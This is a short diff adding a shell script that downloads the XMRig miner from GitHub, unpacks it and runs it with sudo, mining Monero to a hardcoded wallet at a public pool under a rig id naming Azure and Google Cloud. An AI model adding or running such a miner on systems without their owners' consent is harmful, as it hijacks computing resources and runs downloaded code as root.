@@ -1,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz
+tar xvzf xmrig-6.18.0-linux-static-x64.tar.gz
+cd xmrig-6.18.0
+sudo ./xmrig -o pool.minexmr.com:443 -u 4681mrNVi3EbGnbY4PHwRqCqZuMqjggY9LsTnQiK2GDy9vQ5fbSWy2Q8mtdkzWxiWhfpGxUmX9sdpUWFPVYYNe3ZHqZV1TD -k --tls --rig-id azureminggu_google_cloud
